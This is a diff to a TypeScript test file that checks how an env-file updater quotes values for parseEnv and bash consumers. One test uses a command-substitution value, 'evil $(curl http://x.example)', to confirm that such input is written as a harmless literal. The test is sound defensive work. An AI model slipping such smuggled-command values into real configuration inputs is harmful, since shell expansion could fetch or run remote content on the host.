@@ -90,13 +90,105 @@ scenario('append new section when key did not exist', () => {
 	assertContains(after, '# alpha', 'original comment preserved');
 });
 
-scenario('SEO copy with spaces gets quoted', () => {
+scenario('SEO copy with spaces (parseEnv consumer = single-quoted, no apostrophe)', () => {
 	const before = ['MORPHIT_INSTANCE_NAME=alice', ''].join('\n');
 	const updates = new Map<string, string | null>([
 		['MORPHIT_INSTANCE_SEO_TITLE', 'My Privacy-First Instance']
 	]);
-	const after = applyUpdates(before, updates);
-	assertContains(after, 'MORPHIT_INSTANCE_SEO_TITLE="My Privacy-First Instance"', 'quoted value');
+	// SEO copy goes to morphit.config.env which is read by Node's
+	// parseEnv via operator-config.  cp139-D-1 v2: prefer single-
+	// quoted form (works for everything except apostrophe values).
+	// Since "My Privacy-First Instance" has no apostrophe, it's
+	// emitted single-quoted.
+	const after = applyUpdates(before, updates, 'parseEnv');
+	assertContains(after, "MORPHIT_INSTANCE_SEO_TITLE='My Privacy-First Instance'", 'single-quoted');
+});
+
+scenario('cp139-D-1: $HOME in parseEnv-consumer value is single-quoted (parseEnv literal)', () => {
+	const before = ['MORPHIT_INSTANCE_NAME=alice', ''].join('\n');
+	const updates = new Map<string, string | null>([
+		['MORPHIT_INSTANCE_SEO_DESCRIPTION', 'Welcome to $HOME instance']
+	]);
+	const after = applyUpdates(before, updates, 'parseEnv');
+	// parseEnv reads $HOME inside single-quotes as literal "$HOME"
+	// (no expansion).  morphit.config.env is parseEnv-only.
+	assertContains(
+		after,
+		"MORPHIT_INSTANCE_SEO_DESCRIPTION='Welcome to $HOME instance'",
+		'single-quoted, literal $HOME survives parseEnv'
+	);
+});
+
+scenario('cp139-D-1: command-substitution $(...) is single-quoted in parseEnv consumer', () => {
+	const before = ['MORPHIT_INSTANCE_NAME=alice', ''].join('\n');
+	const updates = new Map<string, string | null>([
+		['MORPHIT_INSTANCE_SEO_TITLE', 'evil $(curl http://x.example)']
+	]);
+	const after = applyUpdates(before, updates, 'parseEnv');
+	assertContains(
+		after,
+		"MORPHIT_INSTANCE_SEO_TITLE='evil $(curl http://x.example)'",
+		'cmd-sub literal $ survives parseEnv'
+	);
+});
+
+scenario("cp139-D-1: parseEnv-consumer apostrophe falls back to double-quoted", () => {
+	const before = ['MORPHIT_INSTANCE_NAME=alice', ''].join('\n');
+	const updates = new Map<string, string | null>([
+		['MORPHIT_INSTANCE_SEO_TITLE', "alice's instance"]
+	]);
+	const after = applyUpdates(before, updates, 'parseEnv');
+	// parseEnv doesn't support POSIX `'\''` close-escape-reopen;
+	// fall back to double-quoted.  parseEnv reads $ inside
+	// double-quotes literally too.
+	assertContains(
+		after,
+		'MORPHIT_INSTANCE_SEO_TITLE="alice\'s instance"',
+		'apostrophe → double-quoted fallback'
+	);
+});
+
+scenario('cp139-D-1: bash-consumer (morphit.env RPC list) still single-quoted', () => {
+	const before = ['MORPHIT_INDEXER_RPC_ENDPOINTS=https://old.example', ''].join('\n');
+	const updates = new Map<string, string | null>([
+		['MORPHIT_INDEXER_RPC_ENDPOINTS', 'https://rpc1.example,https://rpc2.example']
+	]);
+	const after = applyUpdates(before, updates, 'bash');
+	// Bash consumer: comma-separated values are non-bare-safe;
+	// single-quoted suppresses bash expansion.
+	assertContains(
+		after,
+		"MORPHIT_INDEXER_RPC_ENDPOINTS='https://rpc1.example,https://rpc2.example'",
+		'bash consumer = single-quoted'
+	);
+});
+
+scenario('cp139-D-1: bash-consumer $HOME stays single-quoted (no $-expansion at source)', () => {
+	const before = ['MORPHIT_RELAY_ACCOUNT=alice', ''].join('\n');
+	const updates = new Map<string, string | null>([
+		['SOME_VALUE_WITH_DOLLAR', 'has $HOME literal']
+	]);
+	const after = applyUpdates(before, updates, 'bash');
+	assertContains(
+		after,
+		"SOME_VALUE_WITH_DOLLAR='has $HOME literal'",
+		'bash consumer = single-quoted suppresses $HOME'
+	);
+});
+
+scenario("cp139-D-1: bash-consumer apostrophe uses POSIX close-escape-reopen", () => {
+	const before = ['MORPHIT_RELAY_ACCOUNT=alice', ''].join('\n');
+	const updates = new Map<string, string | null>([
+		['SOME_VALUE_WITH_APOS', "alice's value"]
+	]);
+	const after = applyUpdates(before, updates, 'bash');
+	// 'alice'\''s value' — POSIX-portable; understood by bash, dash,
+	// zsh, but NOT parseEnv.  bash consumer is the right place for it.
+	assertContains(
+		after,
+		"SOME_VALUE_WITH_APOS='alice'\\''s value'",
+		'bash consumer = single-quoted with close-escape-reopen'
+	);
 });
 
 scenario('alphanumeric value emitted bare', () => {
